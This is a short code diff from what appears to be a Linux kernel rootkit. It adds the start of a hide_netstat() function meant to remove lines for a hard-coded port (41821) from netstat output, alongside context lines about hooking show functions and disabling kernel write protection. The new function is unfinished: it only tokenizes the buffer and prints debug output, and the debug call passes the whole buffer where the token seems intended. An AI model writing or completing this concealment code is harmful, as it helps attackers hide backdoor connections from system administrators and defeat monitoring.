@@ -6,6 +6,8 @@
 
 #define SIZE_PORT_COLON 6
 
+const char *netstat_sep = "\n";
+
 typedef unsigned short port_t;
 
 static port_t to_hide = 41821;
@@ -40,10 +42,16 @@ unhook_show(void)
     enable_protection();
 }
 
+//Hide by removing the appropriate line and decreasing the sequence number accordingly
 static void
 hide_netstat(char *port, struct seq_file *seq)
 {
+    char *tok;
+    char *cur = seq->buf;
 
+    while((tok = strsep(&cur, netstat_sep))) {
+        DEBUG_INFO("Token is %s\n", seq->buf);
+    }
 }
 
 //seq includes all the info we need
